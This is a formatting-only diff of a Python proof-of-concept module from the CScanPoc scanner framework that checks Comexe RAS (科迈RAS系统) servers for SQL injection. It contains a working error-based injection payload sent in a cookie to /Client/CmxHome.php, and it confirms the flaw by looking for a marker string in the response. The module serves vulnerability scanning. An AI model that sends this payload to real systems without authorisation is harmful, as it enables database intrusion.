@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Comexe_0001' # 平台漏洞编号，留空
+    vuln_id = 'Comexe_0001'  # 平台漏洞编号，留空
     name = '科迈RAS系统 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         科迈RAS系统，函数过滤不全导致SQL注射。
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '科迈RAS系统'  # 漏洞应用名称
     product_version = '科迈RAS系统'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'a7bc8bbd-bd0d-406d-a9c0-66ee8bfb165c'
@@ -30,7 +32,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             hh = hackhttp.hackhttp()
             payloads = [
                 "/Client/CmxHome.php cookie",
@@ -40,12 +42,12 @@ class Poc(ABPoc):
             ]
             for payload in payloads:
                 target = self.target + payload
-                header= {
-                    "Cookie":"RAS_UserInfo_UserName=-4758' OR 1 GROUP BY CONCAT(0x71786a6271,(SELECT (CASE WHEN (5786=5786) THEN 1 ELSE 0 END)),0x71707a7171,FLOOR(RAND(0)*2)) HAVING MIN(0)#"
+                header = {
+                    "Cookie": "RAS_UserInfo_UserName=-4758' OR 1 GROUP BY CONCAT(0x71786a6271,(SELECT (CASE WHEN (5786=5786) THEN 1 ELSE 0 END)),0x71707a7171,FLOOR(RAND(0)*2)) HAVING MIN(0)#"
                 }
                 response = requests.get(target, headers=header)
                 if response.status_code == 200 and 'qxjbq1qpzqq1' in response.text:
-                    #security_hole(target)
+                    # security_hole(target)
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
 
@@ -54,6 +56,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
